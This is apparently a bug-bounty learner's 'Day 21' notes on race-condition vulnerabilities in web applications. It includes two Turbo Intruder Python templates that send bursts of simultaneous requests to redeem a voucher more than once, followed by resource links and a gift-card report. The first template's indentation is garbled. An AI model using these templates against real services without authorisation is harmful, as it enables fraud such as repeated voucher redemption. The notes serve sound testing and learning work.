`7 January 2023`
## **Day 21 What I Have Learned**
***
## **Race Condition**
- Race conditions may occur when a process is critically or unexpectedly dependent on the sequence or timings of other events.
- It Happens When you are able to send Multiple Requests at the same time and receive a success response on both 
- e.g Bob has $10 and wants to deposit $10 with a Voucher,Bob Can Send Two request at the same time with the same Voucher,if they both become successful,Bob has Now $30 instead of $20.
***
## **Useful Burp Extension**
1. [Turbo Intruder](https://github.com/PortSwigger/turbo-intruder).
- Send request to turbo intruder.
- Use this python code as a payload of the turbo intruder.
``` js
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                        concurrentConnections=30,
                        requestsPerConnection=30,
                        pipeline=False
                        )

for i in range(30):
    engine.queue(target.req, i)
        engine.queue(target.req, target.baseInput, gate='race1')


    engine.start(timeout=5)
engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```
- Now set the external HTTP header x-request: %s (This is needed by the turbo intruder)
- Click "Attack"
- See multiple 200 OK responses
2. Turbo Intruder 2 Requests Examples
- This following template can use when use have to send race condition of request2 immediately after send a request1 when the window may only be a few milliseconds.
``` js 
def queueRequests(target, wordlists): 
    engine = RequestEngine(endpoint=target.endpoint, 
                           concurrentConnections=30, 
                           requestsPerConnection=100, 
                           pipeline=False 
                           ) 
    request1 = '''
POST /target-URI-1 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>

parameterName=parameterValue
    ''' 

    request2 = '''
GET /target-URI-2 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>
    '''

    engine.queue(request1, gate='race1')
    for i in range(30): 
        engine.queue(request2, gate='race1') 
    engine.openGate('race1') 
    engine.complete(timeout=60) 
def handleResponse(req, interesting): 
    table.add(req)
```
3.You can Find More templates Installed By default in Turbo Intruder.
***
## **Resources**
- [Race Conditions and How to Prevent Them](https://www.youtube.com/watch?v=MqnpIwN7dz0).
- [Turbo Intruder: Embracing the billion-request attack](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack).
- [Race Condition Bug In Web App: A Use Case](https://medium.com/@ciph3r7r0ll/race-condition-bug-in-web-app-a-use-case-21fd4df71f0e).
- [Race Condition](https://book.hacktricks.xyz/pentesting-web/race-condition#oauth2-eternal-persistence).
- [RACE Condition vulnerability found in bug-bounty program](https://pravinponnusamy.medium.com/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43).
- [Test Web Race Conditions](https://securingtomorrow.mcafee.com/technical-how-to/testing-race-conditions-web-applications/).
## **Reports**
- [Race Condition allows to redeem multiple times gift cards which leads to free "money"](https://hackerone.com/reports/759247) ($1,500).
***
## **The End**
